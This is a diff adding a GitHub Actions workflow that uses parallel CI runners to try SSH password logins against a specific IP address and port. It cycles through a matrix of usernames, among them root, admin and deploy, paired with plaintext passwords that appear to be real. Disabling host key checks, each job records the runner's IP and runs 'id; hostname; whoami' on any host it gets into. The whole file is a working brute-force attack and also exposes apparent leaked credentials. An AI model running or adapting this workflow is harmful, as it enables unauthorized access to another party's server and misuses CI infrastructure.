@@ -1,0 +1,56 @@
+name: ssh-matrix
+on: [push, workflow_dispatch]
+jobs:
+  try:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        include:
+          - { u: 'supportfly', p: 'C719o0e00IU8kS8l' }
+          - { u: 'vaibhav', p: 'C719o0e00IU8kS8l' }
+          - { u: 'administrator', p: 'C719o0e00IU8kS8l' }
+          - { u: 'admin', p: 'C719o0e00IU8kS8l' }
+          - { u: 'deploy', p: 'C719o0e00IU8kS8l' }
+          - { u: 'n8n', p: 'C719o0e00IU8kS8l' }
+          - { u: 'node', p: 'C719o0e00IU8kS8l' }
+          - { u: 'ashapurna', p: 'C719o0e00IU8kS8l' }
+          - { u: 'caddy', p: 'C719o0e00IU8kS8l' }
+          - { u: 'www-data', p: 'C719o0e00IU8kS8l' }
+          - { u: 'vaibhav', p: '8%l65l3La' }
+          - { u: 'administrator', p: '8%l65l3La' }
+          - { u: 'admin', p: '8%l65l3La' }
+          - { u: 'deploy', p: '8%l65l3La' }
+          - { u: 'n8n', p: '8%l65l3La' }
+          - { u: 'node', p: '8%l65l3La' }
+          - { u: 'ashapurna', p: '8%l65l3La' }
+          - { u: 'caddy', p: '8%l65l3La' }
+          - { u: 'gendao', p: '8%l65l3La' }
+          - { u: 'root', p: '554411' }
+          - { u: 'ubuntu', p: '554411' }
+          - { u: 'supportfly', p: '554411' }
+          - { u: 'vaibhav', p: '554411' }
+          - { u: 'administrator', p: '554411' }
+          - { u: 'gendao', p: '554411' }
+          - { u: 'root', p: 'o_44h2103e28w' }
+          - { u: 'ubuntu', p: 'o_44h2103e28w' }
+          - { u: 'gendao', p: 'o_44h2103e28w' }
+          - { u: 'supportfly', p: 'o_44h2103e28w' }
+          - { u: 'vaibhav', p: 'o_44h2103e28w' }
+          - { u: 'administrator', p: 'o_44h2103e28w' }
+          - { u: 'admin', p: 'o_44h2103e28w' }
+          - { u: 'gendao.o', p: '44h2103e28w' }
+          - { u: 'gendao.o', p: 'o_44h2103e28w' }
+    steps:
+      - name: attempt
+        env:
+          U: ${{ matrix.u }}
+          P: ${{ matrix.p }}
+        run: |
+          set +e
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
+          echo "RUNNER_IP=$(curl -s -m 10 https://api.ipify.org) U=$U"
+          R=$(timeout 20 sshpass -p "$P" ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPreferredAuthentications=password -oPubkeyAuthentication=no -oConnectTimeout=8 -oNumberOfPasswordPrompts=1 -p 23286 "$U@103.20.213.246" 'id; hostname; whoami' 2>&1 | tail -3)
+          echo "RESULT[$U|$P]: $R"
